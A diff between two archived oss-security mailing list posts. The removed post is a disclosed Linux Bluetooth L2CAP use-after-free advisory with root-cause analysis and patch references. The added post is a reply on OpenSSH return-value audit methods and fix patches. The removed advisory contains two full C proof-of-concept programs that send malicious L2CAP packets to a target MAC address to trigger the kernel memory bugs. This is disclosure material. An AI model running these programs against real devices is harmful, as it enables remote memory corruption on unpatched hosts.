@@ -1,4 +1,4 @@
-Received: (qmail 5857 invoked by uid 550); 14 Dec 2022 18:16:03 -0000
+Received: (qmail 12152 invoked by uid 550); 22 Feb 2025 03:27:18 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,531 +7,469 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 32300 invoked from network); 14 Dec 2022 18:13:44 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=chromium.org; s=google;
-        h=cc:to:subject:message-id:date:from:mime-version:from:to:cc:subject
-         :date:message-id:reply-to;
-        bh=QXBI5P2B+67yYNWdQ+HBPyTuUxpqNo79ATwV5IOE9RY=;
-        b=DNrSF0E7icYwW6b2cDcKNn4kEXdT7sq0QJWt1FPZmmC31f2K+0cQUK/Mj5yWONjfww
-         LwIKoVqJbyIL9mLVK3uC9eAAwZ37D7t2SOMU4BoBKYX/RXpZhUmBQ/WK9xDUC7j/xylT
-         EpE9XFwyA46rFOI5vcfb+EljUF8Ej2j0VAMfo=
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20210112;
-        h=cc:to:subject:message-id:date:from:mime-version:x-gm-message-state
-         :from:to:cc:subject:date:message-id:reply-to;
-        bh=QXBI5P2B+67yYNWdQ+HBPyTuUxpqNo79ATwV5IOE9RY=;
-        b=TQiwGotvIDzMgeC8K9qVZ+8YRwEgtUXf1bgMphCsFE9hijKPFR3f9+9Z2kcYxmbzdL
-         OJDRZkuSbWoWJcBnaqCwEG9ZPJwGDwN/PcjbsGT8VaZZxJlME0c3VYdE9xXk6giXIE6F
-         qAePT8IcoFKUdc3p2IuFZ6SKWj+UZRwyRYzs8k58S5odgwteJC3V/sH1DZs7v7iBNgwA
-         HSF3w80rhqYAtIk/jPDtNsXgMCjRJCL1mIhzMVhIqdlXPCOFLtZqnEh27Pc6r5h70EMz
-         M/iMYrias0p02W/0UDvITplunPJPUYHQhJtDJbQFOkie2dNCwi9QAUEH+CkR9Dg4Rovz
-         cLlQ==
-X-Gm-Message-State: ANoB5pmsYnV2qjl2pYXRyZYm2yyOILmOcZjcRtikvms3qsPUEQprQhHj
-	i5F6Ome434481PnvDY+6mAhl4AOXB2hhZK5SKV4jgv3Na7rWLKTee/cBEw==
-X-Google-Smtp-Source: AA0mqf5hbTaSGftEJx6o1Sp8ht5jR6M5FG0h/h3qzMeQoORtyFFiIl1MffXUBtgOOyD4WMGIYSzEgRLBWiidQ9ga3Kc=
-X-Received: by 2002:a02:8818:0:b0:38a:5560:60db with SMTP id
- r24-20020a028818000000b0038a556060dbmr9751349jai.117.1671041612477; Wed, 14
- Dec 2022 10:13:32 -0800 (PST)
-MIME-Version: 1.0
-From: Rafael Correa De Ysasi <rcorreadeysasi@chromium.org>
-Date: Wed, 14 Dec 2022 13:13:21 -0500
-Message-ID: <CAFXgH+PXHvA8ueX5P2yYHWeOOdkkPjQLHnG9c1gNd53Y1Ekm1Q@mail.gmail.com>
+x-ms-reactions: disallow
+Received: (qmail 5150 invoked from network); 22 Feb 2025 03:25:49 -0000
+Date: Sat, 22 Feb 2025 04:25:21 +0100
+From: Solar Designer <solar@openwall.com>
 To: oss-security@lists.openwall.com
-Cc: 3pvd@google.com
-Content-Type: multipart/alternative; boundary="000000000000b7a4ee05efcdb169"
-Subject: [oss-security] Linux Kernel: UAF in Bluetooth L2CAP Handshake
-
---000000000000b7a4ee05efcdb169
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
-
-Summary
-
-There are use-after-free vulnerabilities in the Linux kernel's
-net/bluetooth/l2cap_core.c's l2cap_connect and l2cap_le_connect_req functio=
-ns
-which may allow code execution and leaking kernel memory (respectively)
-remotely via Bluetooth.
-
-The l2cap_le_connect_req bug was introduced in commit 27e2d4c
-<https://github.com/torvalds/linux/commit/27e2d4c8d28be1d1b4ecfbffab572d7db=
-d35254d>
-(version:
-3.12.0, date: 2013-Dec-05), the SMP channel is available since commit
-70db83c
-<https://github.com/torvalds/linux/commit/70db83c4bcdc1447bbcb318389561c90d=
-7056b18>
-(version:
-3.16.0, date: 2014-Aug-14).
-Severity
-
-Moderate
-Proof of Concept
-
-*UAF read in l2cap_le_connect_req*
-
-*```*
-
-#include <stdlib.h>
-#include <unistd.h>
-#include <sys/socket.h>
-#include <sys/uio.h>
-#include <bluetooth/bluetooth.h>
-#include <bluetooth/l2cap.h>
-#include <bluetooth/hci.h>
-#include <bluetooth/hci_lib.h>
-typedef struct l2cap_le_conn_req {
-        uint16_t     psm;
-        uint16_t     scid;
-        uint16_t     mtu;
-        uint16_t     mps;
-        uint16_t     credits;
-} __attribute__ ((packed)) l2cap_le_conn_req;
-int hci_send_acl_data(int hci_socket, uint16_t hci_handle, void *data,
-uint16_t data_length) {
-  uint8_t type =3D HCI_ACLDATA_PKT;
-  uint16_t BCflag =3D 0x0000;
-  uint16_t PBflag =3D 0x0002;
-  uint16_t flags =3D ((BCflag << 2) | PBflag) & 0x000F;
-
-  hci_acl_hdr hdr;
-  hdr.handle =3D htobs(acl_handle_pack(hci_handle, flags));
-  hdr.dlen =3D data_length;
-
-  struct iovec iv[3];
-
-  iv[0].iov_base =3D &type;
-  iv[0].iov_len =3D 1;
-  iv[1].iov_base =3D &hdr;
-  iv[1].iov_len =3D HCI_ACL_HDR_SIZE;
-  iv[2].iov_base =3D data;
-  iv[2].iov_len =3D data_length;
-
-  return writev(hci_socket, iv, sizeof(iv) / sizeof(struct iovec));
-}
-
-#define L2CAP_CID_LE_SIGNALING  0x0005
-#define L2CAP_LE_CONN_REQ       0x14
-#define L2CAP_CID_SMP           0x0006
-#define L2CAP_CID_SMP_BREDR     0x0007
-int main(int argc, char **argv) {
-  if (argc !=3D 2) {
-    printf("Usage: %s MAC_ADDR\n", argv[0]);
-    return 1;
-  }
-
-  bdaddr_t dst_addr;
-  str2ba(argv[1], &dst_addr);
-
-  printf("[*] Resetting hci0 device...\n");
-  system("sudo hciconfig hci0 down");
-  system("sudo hciconfig hci0 up");
-
-  printf("[*] Opening hci device...\n");
-  struct hci_dev_info di;
-  int hci_device_id =3D hci_get_route(NULL);
-  int hci_socket =3D hci_open_dev(hci_device_id);
-  if (hci_devinfo(hci_device_id, &di) < 0) {
-    perror("hci_devinfo");
-    return 1;
-  }
-
-  struct hci_filter flt;
-  hci_filter_clear(&flt);
-  hci_filter_all_ptypes(&flt);
-  hci_filter_all_events(&flt);
-  if (setsockopt(hci_socket, SOL_HCI, HCI_FILTER, &flt, sizeof(flt)) < 0) {
-    perror("setsockopt(HCI_FILTER)");
-    return 1;
-  }
-
-  int opt =3D 1;
-  if (setsockopt(hci_socket, SOL_HCI, HCI_DATA_DIR, &opt, sizeof(opt)) < 0)=
- {
-    perror("setsockopt(HCI_DATA_DIR)");
-    return 1;
-  }
-
-  printf("[*] Connecting to victim...\n");
-
-  struct sockaddr_l2 laddr =3D {0};
-  laddr.l2_family =3D AF_BLUETOOTH;
-  laddr.l2_bdaddr_type =3D BDADDR_LE_PUBLIC;
-  laddr.l2_bdaddr =3D di.bdaddr;
-
-  struct sockaddr_l2 raddr =3D {0};
-  raddr.l2_family =3D AF_BLUETOOTH;
-  raddr.l2_bdaddr_type =3D BDADDR_LE_PUBLIC;
-  raddr.l2_bdaddr =3D dst_addr;
-
-  int l2_sock;
-  printf("[*] socket\n");
-  if ((l2_sock =3D socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
-    perror("socket");
-    return 1;
-  }
-
-  printf("[*] bind\n");
-  if (bind(l2_sock, (struct sockaddr *)&laddr, sizeof(laddr)) < 0) {
-    perror("bind");
-    return 1;
-  }
-
-  printf("[*] connect\n");
-  if (connect(l2_sock, (struct sockaddr *)&raddr, sizeof(raddr)) < 0) {
-    perror("connect");
-    return 1;
-  }
-
-  printf("[*] getsockopt\n");
-  struct l2cap_conninfo l2_conninfo;
-  socklen_t l2_conninfolen =3D sizeof(l2_conninfo);
-  if (getsockopt(l2_sock, SOL_L2CAP, L2CAP_CONNINFO, &l2_conninfo,
-&l2_conninfolen) < 0) {
-    perror("getsockopt");
-    return 1;
-  }
-
-  uint16_t hci_handle =3D l2_conninfo.hci_handle;
-  printf("[+] HCI handle: %x\n", hci_handle);
-
-  struct {
-    l2cap_hdr hdr;
-    l2cap_cmd_hdr cmd_hdr;
-    l2cap_le_conn_req req;
-  } packet =3D {0};
-  packet.hdr.len =3D htobs(sizeof(packet) - L2CAP_HDR_SIZE);
-  packet.hdr.cid =3D htobs(L2CAP_CID_LE_SIGNALING);
-  packet.cmd_hdr.code =3D L2CAP_LE_CONN_REQ;
-  packet.cmd_hdr.ident =3D 0x1;
-  packet.cmd_hdr.len =3D sizeof(packet.req);
-  packet.req.psm =3D htobs(0);
-  packet.req.scid =3D htobs(0x42);
-  packet.req.mtu =3D htobs(23);
-  packet.req.mps =3D htobs(23);
-  packet.req.credits =3D htobs(0xff);
-
-  printf("[*] Sending malicious L2CAP packet...\n");
-  hci_send_acl_data(hci_socket, hci_handle, &packet, sizeof(packet));
-
-  close(l2_sock);
-  hci_close_dev(hci_socket);
-
-  return 0;
-}
-
-```
-
-*UAF write in l2cap_connect*
-
-*```*
-
-#include <stdlib.h>
-#include <unistd.h>
-#include <sys/socket.h>
-#include <sys/uio.h>
-#include <bluetooth/bluetooth.h>
-#include <bluetooth/l2cap.h>
-#include <bluetooth/hci.h>
-#include <bluetooth/hci_lib.h>
-int hci_send_acl_data(int hci_socket, uint16_t hci_handle, void *data,
-uint16_t data_length) {
-  uint8_t type =3D HCI_ACLDATA_PKT;
-  uint16_t BCflag =3D 0x0000;
-  uint16_t PBflag =3D 0x0002;
-  uint16_t flags =3D ((BCflag << 2) | PBflag) & 0x000F;
-
-  hci_acl_hdr hdr;
-  hdr.handle =3D htobs(acl_handle_pack(hci_handle, flags));
-  hdr.dlen =3D data_length;
-
-  struct iovec iv[3];
-
-  iv[0].iov_base =3D &type;
-  iv[0].iov_len =3D 1;
-  iv[1].iov_base =3D &hdr;
-  iv[1].iov_len =3D HCI_ACL_HDR_SIZE;
-  iv[2].iov_base =3D data;
-  iv[2].iov_len =3D data_length;
-
-  return writev(hci_socket, iv, sizeof(iv) / sizeof(struct iovec));
-}
-
-#define L2CAP_CID_SIGNALING     0x0001
-#define L2CAP_CONN_REQ          0x02
-#define L2CAP_CID_SMP           0x0006
-#define L2CAP_CID_SMP_BREDR     0x0007
-int main(int argc, char **argv) {
-  if (argc !=3D 2) {
-    printf("Usage: %s MAC_ADDR\n", argv[0]);
-    return 1;
-  }
-
-  bdaddr_t dst_addr;
-  str2ba(argv[1], &dst_addr);
-
-  printf("[*] Resetting hci0 device...\n");
-  system("sudo hciconfig hci0 down");
-  system("sudo hciconfig hci0 up");
-
-  printf("[*] Opening hci device...\n");
-  struct hci_dev_info di;
-  int hci_device_id =3D hci_get_route(NULL);
-  int hci_socket =3D hci_open_dev(hci_device_id);
-  if (hci_devinfo(hci_device_id, &di) < 0) {
-    perror("hci_devinfo");
-    return 1;
-  }
-
-  struct hci_filter flt;
-  hci_filter_clear(&flt);
-  hci_filter_all_ptypes(&flt);
-  hci_filter_all_events(&flt);
-  if (setsockopt(hci_socket, SOL_HCI, HCI_FILTER, &flt, sizeof(flt)) < 0) {
-    perror("setsockopt(HCI_FILTER)");
-    return 1;
-  }
-
-  int opt =3D 1;
-  if (setsockopt(hci_socket, SOL_HCI, HCI_DATA_DIR, &opt, sizeof(opt)) < 0)=
- {
-    perror("setsockopt(HCI_DATA_DIR)");
-    return 1;
-  }
-
-  printf("[*] Connecting to victim...\n");
-
-  struct sockaddr_l2 laddr =3D {0};
-  laddr.l2_family =3D AF_BLUETOOTH;
-  laddr.l2_bdaddr_type =3D BDADDR_BREDR;
-  laddr.l2_bdaddr =3D di.bdaddr;
-
-  struct sockaddr_l2 raddr =3D {0};
-  raddr.l2_family =3D AF_BLUETOOTH;
-  raddr.l2_bdaddr_type =3D BDADDR_BREDR;
-  raddr.l2_bdaddr =3D dst_addr;
-
-  int l2_sock;
-  printf("[*] socket\n");
-  if ((l2_sock =3D socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
-    perror("socket");
-    return 1;
-  }
-
-  printf("[*] bind\n");
-  if (bind(l2_sock, (struct sockaddr *)&laddr, sizeof(laddr)) < 0) {
-    perror("bind");
-    return 1;
-  }
-
-  printf("[*] connect\n");
-  if (connect(l2_sock, (struct sockaddr *)&raddr, sizeof(raddr)) < 0) {
-    perror("connect");
-    return 1;
-  }
-
-  printf("[*] getsockopt\n");
-  struct l2cap_conninfo l2_conninfo;
-  socklen_t l2_conninfolen =3D sizeof(l2_conninfo);
-  if (getsockopt(l2_sock, SOL_L2CAP, L2CAP_CONNINFO, &l2_conninfo,
-&l2_conninfolen) < 0) {
-    perror("getsockopt");
-    return 1;
-  }
-
-  uint16_t hci_handle =3D l2_conninfo.hci_handle;
-  printf("[+] HCI handle: %x\n", hci_handle);
-
-  struct {
-    l2cap_hdr hdr;
-    l2cap_cmd_hdr cmd_hdr;
-    l2cap_conn_req req;
-  } packet =3D {0};
-  packet.hdr.len =3D htobs(sizeof(packet) - L2CAP_HDR_SIZE);
-  packet.hdr.cid =3D htobs(L2CAP_CID_SIGNALING);
-  packet.cmd_hdr.code =3D L2CAP_CONN_REQ;
-  packet.cmd_hdr.ident =3D 0x1;
-  packet.cmd_hdr.len =3D sizeof(packet.req);
-  packet.req.psm =3D htobs(0);
-  packet.req.scid =3D htobs(0x42);
-
-  printf("[*] Sending malicious L2CAP packet...\n");
-  hci_send_acl_data(hci_socket, hci_handle, &packet, sizeof(packet));
-
-  close(l2_sock);
-  hci_close_dev(hci_socket);
-
-  return 0;
-}
-
-```
-
-To make SMP available for BR/EDR devices (in case of a hardware supporting
-it is not available), you can force it by running: echo Y >
-/sys/kernel/debug/bluetooth/hci0/force_bredr_smp
-Further Analysis
-
-*Bug Analysis*
-There are UAF races in l2cap_connect
-<https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7ee43=
-b5aaf/net/bluetooth/l2cap_core.c#L4113>
- and l2cap_le_connect_req
-<https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7ee43=
-b5aaf/net/bluetooth/l2cap_core.c#L5789>
-methods.
-After a channel is created via the new_connection callback, it is not
-locked but __set_chan_timer sets up a timer which can call
-l2cap_chan_timeout and can cleanup the channel before the method finishes,
-causing UAF read in l2cap_le_connect_req
-<https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7ee43=
-b5aaf/net/bluetooth/l2cap_core.c#L5899>
- and UAF write in l2cap_connect
-<https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7ee43=
-b5aaf/net/bluetooth/l2cap_core.c#L4247>
-=2E
-
-As the channel timeout is normally 40 seconds
-<https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7ee43=
-b5aaf/include/net/bluetooth/l2cap.h#L55>
- (L2CAP_CONN_TIMEOUT), winning the race would be infeasible, but due to a
-bug in SMP's implementation, SMP channels created by smp_new_conn_cb
-<https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7ee43=
-b5aaf/net/bluetooth/smp.c#L3241>
-have
-their get_sndtimeo callback set to l2cap_chan_no_get_sndtimeo which returns
-0
-<https://github.com/torvalds/linux/blob/2bca25eaeba6190efbfcb38ed169bd7ee43=
-b5aaf/include/net/bluetooth/l2cap.h#L964>
-as
-timeout value thus causing the timer to run immediately (on a different
-thread) after the __set_chan_timer call.
-
-Note: in l2cap_le_connect_req (without FLAG_DEFER_SETUP), the timer is
-canceled via the l2cap_chan_ready call almost immediately after the
-__set_chan_timer call, but even this small time window enough for the timer
-with 0 timeout to start.
-
-Another root cause of the issue can be that the SMP channel is available
-via l2cap_global_chan_by_psm if the request contains psm=3D0. Multiple
-channels can be registered without PSM (PSM is 0, and channel is identified
-by SCID) but only one of them is returned (which needs to be SMP to be able
-to trigger the vulnerability).
-
-```
-
-static int l2cap_le_connect_req(...)
-{
-    ...
-    mutex_lock(&conn->chan_lock);
-    ...
-    chan =3D pchan->ops->new_connection(pchan); // chan is not locked
-    ...
-    __set_chan_timer(chan, chan->ops->get_sndtimeo(chan)); // triggers
-l2cap_chan_timeout running from a different thread
-    ...
-    if (test_bit(FLAG_DEFER_SETUP, &chan->flags)) { // branch usually not t=
-aken
-        ...
-    } else {
-        l2cap_chan_ready(chan); // calls __clear_chan_timer(chan), resets t=
-imer
-        result =3D L2CAP_CR_LE_SUCCESS;
-    }
-    ...
-    mutex_unlock(&conn->chan_lock); // l2cap_chan_timeout is blocked
-until this call
-    ...
-    if (chan) { // [7] UAF read
-        rsp.mtu =3D cpu_to_le16(chan->imtu);
-        rsp.mps =3D cpu_to_le16(chan->mps);
-    } else {
-    ...
-}
-
-```
-
-Similar issue within l2cap_connect:
-
-```
-
-static struct l2cap_chan *l2cap_connect(...)
-{
-    ...
-    mutex_lock(&conn->chan_lock);
-    ...
-    chan =3D pchan->ops->new_connection(pchan); // chan is not locked
-    ...
-    __set_chan_timer(chan, chan->ops->get_sndtimeo(chan)); // triggers
-l2cap_chan_timeout running from a different thread
-    ...
-    mutex_unlock(&conn->chan_lock); // l2cap_chan_timeout is blocked
-until this call
-    ...
-    if (chan && !test_bit(CONF_REQ_SENT, &chan->conf_state) && // UAF read
-        result =3D=3D L2CAP_CR_SUCCESS) {
-        u8 buf[128];
-        set_bit(CONF_REQ_SENT, &chan->conf_state); // UAF write
-        l2cap_send_cmd(conn, l2cap_get_ident(conn), L2CAP_CONF_REQ,
-                   l2cap_build_conf_req(chan, buf, sizeof(buf)), buf);
-        chan->num_conf_req++;
-    }
-    return chan;
-}
-
-```
-
-The affected code path in SMP implementation:
-
-```
-
-static inline struct l2cap_chan *smp_new_conn_cb(struct l2cap_chan *pchan)
-{
-    =E2=80=A6
-    chan->ops =3D &smp_chan_ops;
-    =E2=80=A6
-}
-static const struct l2cap_ops smp_chan_ops =3D {
-    =E2=80=A6
-    .get_sndtimeo =3D l2cap_chan_no_get_sndtimeo,
-    =E2=80=A6
-};
-static inline long l2cap_chan_no_get_sndtimeo(struct l2cap_chan *chan)
-{
-    return 0;
-}
-
-```
-
-*Reachability*
-SMP channel is available for Bluetooth Low Energy since BT 4.0 (~2009)
-which can be used to trigger the UAF read in l2cap_le_connect_req, and it
-is also available for BT BR/EDR since BT 5.2 (~2020, to support Secure
-Connections) to trigger the UAF write in l2cap_connect.
-
-No other prerequisites were found, the bugs were triggered on a
-KASAN-enabled Ubuntu 22.04 kernel (an artificial delay was added before the
-UAF read/write to make winning the race easier).
-
-Note: it is possible that the bugs can be triggered via other channels
-which may be created automatically by the specific environment.
-Patch
-
-The vulnerability was fixed by not accepting 0 as a valid PSM value in
-commit 711f8c3
-<https://github.com/torvalds/linux/commit/711f8c3fb3db61897080468586b970c87=
-c61d9e4>
-and
-by preventing l2cap_global_chan_by_psm to give back L2CAP_CHAN_FIXED channe=
-ls
-in commit f937b75
-<https://github.com/torvalds/linux/commit/f937b758a188d6fd328a81367087eddbb=
-2fce50f>
-=2E
-Timeline
-
-*Date reported*: 10/06/2022
-*Date fixed*: 10/26/2022
-*Date disclosed*: 11/28/2022
-
---000000000000b7a4ee05efcdb169--
+Cc: Qualys Security Advisory <qsa@qualys.com>,
+	Dmitry Belyavskiy <dbelyavs@redhat.com>,
+	Jordy Zomer <jordy@pwning.systems>, Damien Miller <djm@mindrot.org>
+Message-ID: <20250222032521.GA30890@openwall.com>
+References: <20250218091414.GA26981@localhost.localdomain>
+Mime-Version: 1.0
+Content-Type: multipart/mixed; boundary="fdj2RfSjLxBAspz7"
+Content-Disposition: inline
+In-Reply-To: <20250218091414.GA26981@localhost.localdomain>
+User-Agent: Mutt/1.4.2.3i
+Subject: Re: [oss-security] MitM attack against OpenSSH's VerifyHostKeyDNS-enabled client
+
+--fdj2RfSjLxBAspz7
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+
+Hi,
+
+Thank you Qualys for the very interesting research, as is usual from you.
+
+On Tue, Feb 18, 2025 at 09:14:36AM +0000, Qualys Security Advisory wrote:
+> - we manually audited all of OpenSSH's functions that use "goto", for
+>   missing resets of their return value;
+> 
+> - we wrote a CodeQL query that automatically searches for functions that
+>   "goto out" without resetting their return value in the corresponding
+>   "if" code block.
+
+I didn't go as far as CodeQL, but I also did some semi-manual auditing:
+
+grep -A100 '[^a-z_]if.[^=!<>]*=[^=]' *.c | less
+
+and then search for goto.  I did this against patched OpenSSH source
+tree installed with "rpmbuild -rp openssh-8.7p1-43.el9.src.rpm" hoping
+to spot any issues there may be specific to this older base OpenSSH
+version or Red Hat's changes to it.
+
+This is indeed imperfect as it e.g. doesn't catch assignments only seen
+on further lines within an "if" condition (not the line with "if" on it)
+if the condition spans multiple lines.  I also ran out of time
+completing this review.  In the portion that I did review, I only found
+a subset of the same issues that Qualys had found, plus one related
+uninteresting bug (see below).
+
+> Our manual audit (of all the functions that use "goto") allowed us to
+> verify that our CodeQL query does not produce false negatives (which
+> would be worse than false positives), but it also allowed us to review
+> code that is similar but not identical to the idiom presented in the
+> "Background" section.
+> 
+> In OpenSSH's client, the following code, which checks the server's
+> identity (the server's host key), naturally caught our attention:
+> 
+> ------------------------------------------------------------------------
+>   93 static int
+>   94 verify_host_key_callback(struct sshkey *hostkey, struct ssh *ssh)
+>   95 {
+>  ...
+>  101         if (verify_host_key(xxx_host, xxx_hostaddr, hostkey,
+>  102             xxx_conn_info) == -1)
+>  103                 fatal("Host key verification failed.");
+>  104         return 0;
+>  105 }
+> ------------------------------------------------------------------------
+> 1470 int
+> 1471 verify_host_key(char *host, struct sockaddr *hostaddr, struct sshkey *host_key,
+> 1472     const struct ssh_conn_info *cinfo)
+> 1473 {
+> ....
+> 1538         if (options.verify_host_key_dns) {
+> ....
+> 1543                 if ((r = sshkey_from_private(host_key, &plain)) != 0)
+> 1544                         goto out;
+> ....
+> 1571 out:
+> ....
+> 1580         return r;
+> 1581 }
+> ------------------------------------------------------------------------
+
+Given that the actually security-relevant bug turned out to be "similar
+but not identical to the idiom" that Qualys wrote they did most auditing
+of, I then switched to going through:
+
+grep 'if.*(.*(.*== *-1' *.c | less
+
+This is similarly imperfect (only catches function calls directly from
+the "if" line, not return values assigned to a variable just before, and
+doesn't catch continuation lines), but at least I completed this review
+for openssh-9.9p1.  This amounted to separately locating and reviewing
+the bodies of called OpenSSH-specific functions (not libc functions nor
+compatibility wrappers) and sometimes those of nested function calls.
+
+(I assumed the compatibility wrappers correctly implement the same
+function that a library would, including return value semantics.
+Someone may review them separately.  I actually happened to look at a
+few, but that's very far from exhaustive.)
+
+I then diff'ed the output of the above grep command vs. the same for the
+openssh-8.7p1-43.el9 tree, and similarly reviewed code for all lines of
+grep output that are added for openssh-8.7p1-43.el9.
+
+With this, I also only found another uninteresting bug (see below).
+
+I wonder if such review could also be automated with CodeQL (or maybe
+even the classic Coccinelle?), or if it's beyond tools' capabilities?
+
+> 2025-02-10: Advisory and patches sent to distros@openwall.
+
+Qualys did in fact share a patch from upstream OpenSSH developers, which
+I now see is identical to changes that went into 9.9p2 (which also
+includes some other changes).  As I found this focused patch helpful for
+my code reviews and fix backporting, I also attach it here.
+
+I also attach my result of applying the patch to openssh-8.7p1-43.el9.
+I reviewed that whatever hunks did not apply were in fact inapplicable
+to this version.  I also added a fix for my uninteresting bug one:
+
++++ openssh-8.7p1-43.el9-tree.qualys-retval/ssh-agent.c	2025-02-21 04:01:32.677160367 +0000
+@@ -700,6 +700,8 @@ process_add_identity(SocketEntry *e)
+ 	if ((r = sshkey_private_deserialize(e->request, &k)) != 0 ||
+ 	    k == NULL ||
+ 	    (r = sshbuf_get_cstring(e->request, &comment, NULL)) != 0) {
++		if (!r) /* k == NULL */
++			r = SSH_ERR_INTERNAL_ERROR;
+ 		error_fr(r, "parse");
+ 		goto out;
+ 	}
+
+This should prevent logging a confusing "parse: success" message on
+"k == NULL", as r could have been set to 0 on the line before.
+
+This issue is also present in upstream OpenSSH 9.9p2.
+
+As to my uninteresting bug two, it's illustrated by this patch (also
+attached here):
+
++++ openssh-8.7p1-43.el9-tree.krb5-ssh_asprintf_append/auth-krb5.c	2025-02-21 03:37:13.106465704 +0000
+@@ -309,13 +309,14 @@ ssh_asprintf_append(char **dsc, const ch
+ 	i = vasprintf(&src, fmt, ap);
+ 	va_end(ap);
+ 
+-	if (i == -1 || src == NULL)
++	if (i == -1)
+ 		return -1;
+ 
+ 	old = *dsc;
+ 
+ 	i = asprintf(dsc, "%s%s", *dsc, src);
+-	if (i == -1 || src == NULL) {
++	if (i == -1) {
++		*dsc = old;
+ 		free(src);
+ 		return -1;
+ 	}
+
+This is in RH-added Kerberos support code.  The issue was that if the
+second asprintf() call failed, it'd leave *dsc undefined, yet the caller
+of this function would free() memory via that pointer.  In practice,
+glibc would either leave the pointer unchanged or reset it to NULL
+(varying by glibc version and specific error condition), both of which
+are safe to free().  Yet resetting "*dsc = old;" should be safer, and
+should avoid the memory leak that happens if *dsc got reset to NULL.
+That memory leak shouldn't have mattered anyway because it'd only occur
+when the process already has trouble allocating more memory here.
+
+The "src == NULL" checks are dropped because the first one shouldn't
+matter if asprintf() behaves correctly and wouldn't help if it does not
+(as src isn't initialized to NULL before the call), the second one
+is wrong (was probably meant to check *dsc, not src), and further code
+in this same source file relies on asprintf() return value anyway.
+
+These patches just went into the Rocky Linux SIG/Security package of
+OpenSSH for EL9:
+
+https://sig-security.rocky.page/packages/openssh/
+https://git.rockylinux.org/sig/security/src/openssh
+
+The above auth-krb5.c patch is actually untested since we currently
+build that package with Kerberos support excluded (and besides it'd take
+specific effort to trigger that error path).
+
+Alexander
+
+--fdj2RfSjLxBAspz7
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: attachment; filename="openssh-9.9-upstream-retval.patch"
+
+diff --git a/krl.c b/krl.c
+index 51a2871..4ecb2c7 100644
+--- a/krl.c
++++ b/krl.c
+@@ -672,6 +672,7 @@ revoked_certs_generate(struct revoked_certs *rc, struct sshbuf *buf)
+ 			break;
+ 		case KRL_SECTION_CERT_SERIAL_BITMAP:
+ 			if (rs->lo - bitmap_start > INT_MAX) {
++				r = SSH_ERR_INVALID_FORMAT;
+ 				error_f("insane bitmap gap");
+ 				goto out;
+ 			}
+@@ -1057,6 +1058,7 @@ ssh_krl_from_blob(struct sshbuf *buf, struct ssh_krl **krlp)
+ 	}
+ 
+ 	if ((krl = ssh_krl_init()) == NULL) {
++		r = SSH_ERR_ALLOC_FAIL;
+ 		error_f("alloc failed");
+ 		goto out;
+ 	}
+diff --git a/packet.c b/packet.c
+index 72803fd..fa0f7ca 100644
+--- a/packet.c
++++ b/packet.c
+@@ -1839,6 +1839,14 @@ ssh_packet_read_poll_seqnr(struct ssh *ssh, u_char *typep, u_int32_t *seqnr_p)
+ 			if ((r = sshpkt_get_string_direct(ssh, &d, &len)) != 0)
+ 				return r;
+ 			DBG(debug("Received SSH2_MSG_PING len %zu", len));
++			if (!ssh->state->after_authentication) {
++				DBG(debug("Won't reply to PING in preauth"));
++				break;
++			}
++			if (ssh_packet_is_rekeying(ssh)) {
++				DBG(debug("Won't reply to PING during KEX"));
++				break;
++			}
+ 			if ((r = sshpkt_start(ssh, SSH2_MSG_PONG)) != 0 ||
+ 			    (r = sshpkt_put_string(ssh, d, len)) != 0 ||
+ 			    (r = sshpkt_send(ssh)) != 0)
+diff --git a/ssh-agent.c b/ssh-agent.c
+index 73276f6..607c4a0 100644
+--- a/ssh-agent.c
++++ b/ssh-agent.c
+@@ -1207,6 +1207,7 @@ parse_key_constraint_extension(struct sshbuf *m, char **sk_providerp,
+ 	    "restrict-destination-v00@openssh.com") == 0) {
+ 		if (*dcsp != NULL) {
+ 			error_f("%s already set", ext_name);
++			r = SSH_ERR_INVALID_FORMAT;
+ 			goto out;
+ 		}
+ 		if ((r = sshbuf_froms(m, &b)) != 0) {
+@@ -1216,6 +1217,7 @@ parse_key_constraint_extension(struct sshbuf *m, char **sk_providerp,
+ 		while (sshbuf_len(b) != 0) {
+ 			if (*ndcsp >= AGENT_MAX_DEST_CONSTRAINTS) {
+ 				error_f("too many %s constraints", ext_name);
++				r = SSH_ERR_INVALID_FORMAT;
+ 				goto out;
+ 			}
+ 			*dcsp = xrecallocarray(*dcsp, *ndcsp, *ndcsp + 1,
+@@ -1233,6 +1235,7 @@ parse_key_constraint_extension(struct sshbuf *m, char **sk_providerp,
+ 		}
+ 		if (*certs != NULL) {
+ 			error_f("%s already set", ext_name);
++			r = SSH_ERR_INVALID_FORMAT;
+ 			goto out;
+ 		}
+ 		if ((r = sshbuf_get_u8(m, &v)) != 0 ||
+@@ -1244,6 +1247,7 @@ parse_key_constraint_extension(struct sshbuf *m, char **sk_providerp,
+ 		while (sshbuf_len(b) != 0) {
+ 			if (*ncerts >= AGENT_MAX_EXT_CERTS) {
+ 				error_f("too many %s constraints", ext_name);
++				r = SSH_ERR_INVALID_FORMAT;
+ 				goto out;
+ 			}
+ 			*certs = xrecallocarray(*certs, *ncerts, *ncerts + 1,
+@@ -1744,6 +1748,7 @@ process_ext_session_bind(SocketEntry *e)
+ 	/* record new key/sid */
+ 	if (e->nsession_ids >= AGENT_MAX_SESSION_IDS) {
+ 		error_f("too many session IDs recorded");
